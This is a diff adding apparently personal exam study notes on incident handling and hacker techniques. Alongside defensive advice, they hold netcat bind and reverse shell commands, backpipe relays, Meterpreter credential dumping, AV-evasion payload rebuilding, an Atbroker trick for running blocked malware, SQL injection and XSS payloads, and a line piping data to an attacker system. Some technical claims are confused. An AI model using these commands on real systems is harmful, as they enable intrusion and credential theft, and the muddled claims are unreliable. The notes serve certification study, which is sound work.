@@ -1,0 +1,333 @@
+Important Highlights
+TREAT INTERNAL NETWORK AS HOSTILE BECAUSE IT IS!!!!
+
+RITA and Bro/Zeek are excellent tools, should try to get them into the environment.
+ 
+Milton Security - USB Informer
+
+Shut down! DO NOT just close lid and walk away. Leaves systems vulnerable to Inception attacks.
+
+Disable USB boot to stop Kon-Boot attacks.
+
+Disable LLMNR - Mitigates LAN Turtle and Responder attacks.
+ 
+LLMNR = Responder Attacks
+WPAD = PACdoor
+Useful Commands
+Linux - nohup = no hangup. Persist through restarts
+ 
+netstat -naob : Show running processes and application info. Run as admin
+ 
+tasklist /svc : run as admin - shows svchosts and the associated servvices
+ 
+wmic process get processid,parentprocessid,executablepath|find <PID> : Get Processes and Parent Processes
+ 
+                                Powershell Scripted Parent Process:
+ 
+                                    get-process | select processname, id, cpu | out-gridview
+                                    Write-host ""
+                                    $Proc = Read-host -prompt "Enter the PID of the process you wish to investigate"
+                                    Write-Host ""
+                                    $p = Get-Process -id $PID
+                                    $parent = (gwmi win32_process | ? processid -eq  $p.Id).parentprocessid
+                                    get-process -id $parent | select processname, id, cpu, path
+    
+ 
+nmap --reason : Reason flag tells you why nmap thinks a port is open, closed or filtered
+ 
+IDS bypass - send partial packet (eg, get /etc/sha), then send RST packet with invalid checksum, then send last part of packet (eg, dow)
+ 
+ 
+Defending against SMB Attacks
+Block the following ports where not needed: TCP - 445, 135, 137, 139
+                                                UDP - 445, 137, 138
+Enable host firewall and allow server ranges and DC's but block workstations from communicating to each other on those ports.
+Attacking SMB
+Linux workstation - rpcclient and smbclient
+        smbclient commands:
+            enumerate shares on target: smbclient -L <host> -U <username>
+            connect to share on target: smbclient -U <username> //<host>/<share> -m <SMB Version>
+           
+        rpcclient commands:
+            Connect to target: rpccllient <host> -U <username>
+            Get list of available commands: help
+            Get list of all enum commands: enum<TabTab>
+            Enumerate Users: enumdomusers
+            Enumerate Domain Groups: enumalsgroups domain
+            Enumerate Builtin Groups: enumalsgroups bultin
+            Get User Info (eg: SID, RID): lookupnames <username>
+            Get Detailed User Info: queryuser <RID>
+Nessus/Vulnerability Scans
+Look for:
+        Banners, Office file inventory and things like indexable directories
+Netcat
+    stdin = 0
+    stdout = 1
+    stderr = 2
+    stderr is messages from Netcat itself, and does not pollute the data you're working with
+   
+    Data transfer from listener to client:
+        listener: nc -l -p 1234 < filename
+        client: nc listenerIP 1234 < filename
+       
+    Data transfer from client to listener:
+        listener: nc -l -p 1234 > filename
+        client: nc listenerIP 1234 < filename
+       
+    Port scanning:
+        nc -v -w3 -z targetIP startport-endport
+       
+    Shells and Backdoors:
+        Setting it up:
+            Unix systems:
+                nc -l -p port -e /bin/sh
+            Windows systems:
+                nc -l -p port -e cmd.exe
+   
+        Connecting (Reverse Shell):
+            nc listenerIP port
+           
+    netcat does not have persistent listener - when connection is terminated listener is stopped
+   
+    Windows will maintain persistence if run with the -L switch
+   
+    Linux systems can have persistent listener via a script with nohup (nohangup - ignores logout), a crobjob, or rare instances of netcat that support -L
+        script:
+            while [ 1 ]; do echo "Started"; nc -l -p port -e /bin/sh; done
+       
+        run the script like this:
+        nohup netcat.sh &
+   
+    Linux:
+    Create FIFO file - mknod <filename> p
+   
+    netcat relay:
+        Used to gain access to segemented systems
+        command:    nc -l -p <port> 0<backpipe | nc <next relay IP> <port> 1>backpipe
+       
+    netcat does not have the execute option (-e) by default:
+    Can be bypassed via backpipe
+        example: /bin/bash 0<backpipe | nc -l -p <port> 1>backpipe
+       
+Buffer Overflow
+XOR simply compares to see if objects are the same or different
+msfelfscan and msfpescan are automated tools used to look for overlow conditions in source code
+!exploitable is an automated tool that estimates how exploitable a flaw is
+Look for crashes on instruction pointer (EIP on x86 and RIP on x64 systems)
+Send long repeating and incrementing strings of characters to determine how many characters are needed to trigger an overflow -  look      in the return pointer for that info
+Permissions of the application or the user running the application is the level of permission a attacker receives
+"Bad Characters" hex code 00 = end of string; Metsploit has utility that will find bad characters to avoid (findbadchar)
+Return Pointer must be real mem location, cannot be virtual memory location
+Return Pointers and Addresses are moving (ASLR - Address Space Layout Randomization created as security feature)
+ASLR can be defeated using NOP sled (No Op)(hex 90 - tells CPU do nothing)
+Protocol Parser Buffer Overflows are very common - things like Wireshark or Firewalls are extrememly vulnerable to these. These                  applications typically run as root or System.
+File Parsers also extrememly vulnerable to buffer overflow attacks - Antivirus tools, Word processors, Office applications, Adobe products
+ 
+Metasploit
+Setting or changing target can assist in bypassing AV
+        MOF = Direct to Memory Upload
+   
+Always migrate meterpreter to lsass.exe to perform hashdump in windows 10
+Meterpreter must be migrated to the process you are trying to capture when using keyscan (eg, explorer.exe for browser and application info, winlogon.exe for username and password, cmd.exe for cmd, etc...)
+Application Whitelisting
+Allow applications to execute from known good locations (eg, Program Files, Program Files (x86), Windows) - This prevents majority of drive-by attacks, execution from Downloads, and Desktop, etc...
+Can use Windows Defender Exploit Guard - TEST IT in the environment. Can break legitimate applications that execute from the stack
+Use SELinux on Unix systems where applicable/available. TEST IT!
+DEP (Data Execution Prevention) is trivially bypassed via most metasploit modules and payloads. Set Artithmetic Accumulator Lower Order 16-bits to 2, jump to address that checks for DEP and if it returns a 2, shut it off for the entire system.
+Used in conjuction with ASLR and Windows Defender Exploit Guard, it makes the systems much harder to attack.
+   
+Secure Coding
+Automated tools to check for code insecurity - SWAMP, RATS, and Flawfinder search for weak code in C and C++
+https://en.wikipedia.org/wiki/List_of_tools_for_static_code_analysis
+Endpoint Security Bypass
+Veil-Evasion and Magic Unicorn are great tools for bypassing EDR
+Macros are excellent points of entry
+PowerPoint can be edited to execute macros on file open by decompressing the file and editing the code from run_on_click or run_on_mouseover to run_on_open
+Magic Unicorn usually works to bypass AV. AV Vendors gave up writing signatures for it, and other software
+Ghostwriting binaries is easy, and works.
+        use msfvenom to create payloads
+        copy Ruby Gems into the environment that allows disassemble and reassembly of executable code (.rb disassemble, peencode and exeencode)
+        ruby disassemble.rb payload.raw > payload.asm
+        gedit payload.asm
+        add these to the top:
+            .section '.text' rwx
+            .extrypoint
+        add this right before xor line"
+            push eax
+            pop eax
+        then compile it:
+            ruby peenconde.rb payload.asm -o payload.exe
+           
+           
+Insert code in code caves
+Endpoint AV have trouble with Golang executables
+Environemntally keyed payloads
+Code Signing - most Av's will ignore signed executables
+LOL (Living off the Land):
+        can use Atbroker to run malware that is otherwise blocked
+         malware.exe - running malware.exe is blocked (Access is denied)
+         reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware"
+         reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0
+         reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\malware.exe
+         atbroker /start malware
+This works because the atbroker is a trusted process and using it to start the malware makes the malware a child process - child processes of trusted process are inherently trusted.
+       
+ 
+Password Attacks
+Password Guessing - OSINT of target to create password lists
+        find valid user ID's
+        Use automated tools to improve accuracy and speed
+    Password Cracking - already compromised the system, downloaded hashes and offline attacks against passwords
+        As soon as you get access to a system, dump, crack and use the passwords.
+        LANMAN and NT hashes are the only passwords stored on a windows system
+        NTLMv1 and NTLMv2 are authentication protocols, NOT hashes
+        
+    Linux Passwords:
+        Only stored in /etc/shadow - no passwords are stored in /etc/passwd
+        
+                Indicator | Hash Type
+                    (no $ ) | DES
+                    $1 | MD5
+                    $2 | Blowfish
+                    $5 | SHA-256
+                    $6 | SHA-512
+        
+        Password Construction:
+        sec580:$1$5XEtFMh0$5t7Dwuf4pBFEbvtGCkQn90:17315:0:99999:7:::
+        username:Indicator$Salt$Base64 encoded representation of password hash:
+ 
+    John the Ripper:
+        Usage: john --wordlist=<wordlist> <hash file> --rules=<rule>
+        Linux passwords without shadowing, feed John the /etc/passwd file
+        Shadowed Linux password cracking requires /etc/shadow and /etc/passwd to crack
+            unshadow /etc/passwd /etc/shadow > password.txt   ---- IMPORTANT! passwd file first, then shadow! -----
+        Windows systems, give John the text output from meterpreter, mimikatz or impacket
+        
+        Generate passwords with john - john --wordlist:<file containing words to build from> --rules:<rule> --stdout > <filename for new passwords>
+        
+    Hashcat:
+        Usage: hashcat64 -a <attack method> -m <hash id> <wordlist/mask> <hash or hash file> -r <rule> -w <number of workers> -O
+ 
+ 
+Web Application Attacks
+OWASP - ZAP (Zed Attack Proxy)
+   
+    Account Harvesting
+        MailSniper
+        CredSniper
+        Errors can identify incorrect passwords or non-existent accounts
+        OWA is vulnerable but can leverage MFA to prevent login, Exchange Web Services does not use MFA and is typically installed with OWA
+   
+    Command Injection:
+        user input fields - gibberish ; command ; gibberish
+        Benign commands to try:
+            ping <AttackerIPAddress>
+            nslookup <AttackerDomain>
+           
+    SQL Injection
+        Improper handling of user input
+        Auth without Authing = ' or 1=1;--
+        Could also use ' or '1'='1
+        Retrieval of paasword hashes possible - NOUSER' union select username, password from isers where username !=;
+        SIEM  can detect - search logs for Union, Join, etc...
+       
+    Cross-Site Scripting
+        Attacker crafts URL with script in it
+        SScript in the URL is sent to server as user inputUser input displayed back to the user - script is "reflected" back to the client
+        Script runs on client browser
+        Example:
+            <SCRIPT>alert("You are vulnerable to cross-site scripting!");</SCRIPT>
+       
+        How it works:
+            Victim uses website that sets cookie in their browser
+            Victim clicks URL or visits site that includes malicious script
+            Victim's browser transmits the code to the target site as a web request
+            Target site reflects the code back to victim in response
+            Code executes in victim's browser as the target site
+           
+        XSS Attacks can be placed into log data and executed against the logging server/SIEM
+        Filter user input to remvoe meaningful characters (eg, "'`*;)
+        mod_security modules automate the input sanitization
+        limit cookie accessibility with HttpOnly flag
+       
+DoS (Denial of Service) Attacks
+DNS Reflection - larger response than request - can respond to 60 bytes requests with 4000 byte response and large TXT records (EDNS Servers)
+Keeping/Maintaining Access
+VNC payloads in Metasploit - bundled executable and dll are caught by AV, but replacing with newer files usually bypasses detections
+    WinVNC can be run as a service - persists through reboots
+   
+    rekall
+        starts book 5 page 24
+        SQL like syntax for grep like output
+       
+Rootkits
+Rootkits are very good at hiding themselves
+explorer.dll and iexplore.dll are not normal/legitimate files - they are part of a rootkit
+Hiding Tracks
+These logs are difficult to edit because they have binary data built into them:
+        Linux systems:
+            utmp - contains info on currently logged in users. Default location /var/run/utmp
+            wtmp - contains data about past use logins. Default location /var/run/wtmp
+            btmp - conatins bad login entries for failed logins. Default location /var/run/btmp
+            lastlog - shows login name, port and last login time for each user. Default location /var/log/lastlog
+        Windows Systems:
+            Application.evtx - Application-oriented events
+            Security.evtx - Security events
+            System.evtx - System Events (Readable by all users)
+             -- Shadow Brokers released the DanderSpritz tool with live editing of event logs
+ 
+    /dev/tcp - compile option. Useful for setting listener on some systems with raw tcp socket access
+    
+    
+    Stegonography - Hide data within data
+        jsteg - hides in jpeg images
+        MP3Steg0 - hides in mpeg files
+        S-Mail - hides in .exe and .dll files
+        Invisible Secrets - hides in banner ads on websites
+        Stash - hides in multiple image formats
+        Hydan - hides in Unix/Linux and Windows executables
+        OpenStego - embeds data nad digital watermarks into images
+        SilentEye - embeds encrypted data into jpeg, bmp and wav files
+        OpenPuff - embeds data into images, audio, video and flash files - multi-password support, plausible deniability,  multiple rounds of encryption with fdifferent algorithms
+    Detecting Stego:
+        StegExpose - Java tool to detect stego
+        
+    Train others on what stego is.
+    If you find stego, you will need to let it go and get a keylogger on the system to get the passwords for that data.
+    Ttypical use cases are data exfiltration, illegal images, and terrorist communications
+    
+    Covering tracks on the Network 
+    Covert channels - tunneling protocols within protocols
+        Reverse HTTP Shells - work through proxies, may evade monitoring by shceduled pull requests
+        ICMP tunnels - Ptunnel ends ping request with TCP packet in payload
+        Covert_TCP - Designed to transfer files, can bounce traffic off of legitimate sites to hide
+        Gcat - Full C&C backdoor where all command and control flows over gmail
+ 
+ 
+Notes for Questions I missed on the Practice Exams
+
+ 
+ARP poisoning configured on attacker system and pointed to gateway
+When rebuilding compromised systems, rebuild from original media
+Covert_TCP uses the sequence number field in packets to exfiltrate data
+CyberCPR hashes all uploaded files
+Remove page from Google - send electronic request and make specific change to site to prove control of site (eg, meta tag)
+Split DNS - uses two servers, one internal and one external to prevent enumeration of internal systems from the internet
+Bypass DEP with ROP (Return Oriented Programming)
+3way handshake - SYN > SYNACK > ACK
+ARPWatch used to detect MAC spoofing
+Alternate Data Streams - can be found using dir /r/s and will cause errors if destination filesystem is not NTFS
+TCP packets with invalid checksums = Dropped
+Send DNS via NetCat - nc -l 53 | nc <attacker system> <port>
+netstat -nao : o shows the PID of the connected processes
+memoryze is an evidence collection tool for DFIR
+You can bypass client-side character filtering by using a web proxy
+get full list of startup applications and their information - wmic startup list full
+Most useful when used with get parameters of Caption, Command, Description, Location, SettingID and User
+
+
+Useful Sites/Resources
+https://jpcertcc.github.io/ToolAnalysisResultSheet/
+https://github.com/sans-blue-team/DeepBlueCLI - Requires PowerShell and command line logging enabled
+https://github.com/JPCERTCC/LogonTracer
+
